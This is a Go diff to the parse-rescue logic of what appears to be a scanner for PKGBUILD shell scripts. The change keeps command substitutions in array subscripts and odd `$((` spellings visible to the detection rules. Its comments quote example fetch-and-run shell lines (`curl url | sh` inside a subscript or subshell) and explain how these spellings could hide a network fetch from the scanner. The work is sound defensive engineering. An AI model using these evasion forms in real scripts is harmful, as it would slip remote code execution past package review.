@@ -77,7 +77,7 @@ func rescueParse(path string, raw []byte) *syntax.File {
 		}
 		if !rescueSubscript(work, off, restore) && !rescueInlineArray(work, msg, off, structural) &&
 			!rescueArithFallback(work, msg, off, restore) && !rescueEmptyExpansion(work, msg, off, restore) &&
-			!rescueCmdSubstParen(work, off, restore) && !rescueHeredocText(work, off, restore) {
+			!rescueCmdSubstParen(work, off, structural) && !rescueHeredocText(work, off, restore) {
 			return nil
 		}
 	}
@@ -222,6 +222,17 @@ func rescueSubscript(work []byte, off int, restore map[int]byte) bool {
 			return false
 		}
 	}
+	// An expansion inside the key must not be blanked. Bash expands a
+	// subscript when it evaluates the assignment, so `m[1.2$(curl url | sh)]=y`
+	// runs that command; flattening it to literal text would leave the rules
+	// reading an inert string and reporting nothing. No real key needs one —
+	// a subscript that is only a variable reference parses as arithmetic and
+	// never reaches this rescue — so the rescue fails closed and the caller
+	// reports the original parse error, which grades the package unscanned
+	// rather than clean.
+	if bytes.ContainsAny(work[lb+1:rb], "$`") {
+		return false
+	}
 	changed := false
 	for i := lb + 1; i < rb; i++ {
 		if work[i] == '_' {
@@ -345,7 +356,7 @@ func rescueEmptyExpansion(work []byte, msg string, off int, restore map[int]byte
 // rescueArithFallback covers the neighbouring `$((( cmd )) ...)` spelling,
 // where the inner command is arithmetic rather than a subshell and upstream
 // fails at the end of the construct instead of inside it.
-func rescueCmdSubstParen(work []byte, off int, restore map[int]byte) bool {
+func rescueCmdSubstParen(work []byte, off int, structural map[int]bool) bool {
 	// The nearest `$((` at or before the failure is the construct upstream is
 	// inside; anything earlier belongs to an expansion that already closed.
 	p := -1
@@ -365,15 +376,21 @@ func rescueCmdSubstParen(work []byte, off int, restore map[int]byte) bool {
 	if q < 0 || q+1 >= len(work) || work[q+1] == ')' {
 		return false
 	}
-	for _, i := range []int{p + 2, q} {
-		if work[i] == '_' {
-			return false // already rewritten once; do not loop
-		}
-		if _, seen := restore[i]; !seen {
-			restore[i] = work[i]
-		}
-		work[i] = '_'
+	if structural[p+2] || structural[q] {
+		return false // already rewritten once; do not loop
 	}
+	// Both parens become spaces rather than word characters. Blanking them to
+	// `_` the way the other rescues do would glue the byte onto the subshell's
+	// first and last words — `$((curl url | sh) | tr)` would present its
+	// command as `(curl`, which the rules match by name and would not
+	// recognise, so a PKGBUILD could hide a network fetch behind this
+	// spelling. As whitespace the parens leave every command word exactly as
+	// written, at its original offset; what is lost is only the subshell's
+	// grouping, so `(a || b) | c` flattens to `a || b | c`. That is a
+	// structural change, recorded as such, and it can only widen what a rule
+	// sees, never narrow it.
+	structural[p+2], structural[q] = true, true
+	work[p+2], work[q] = ' ', ' '
 	return true
 }
 
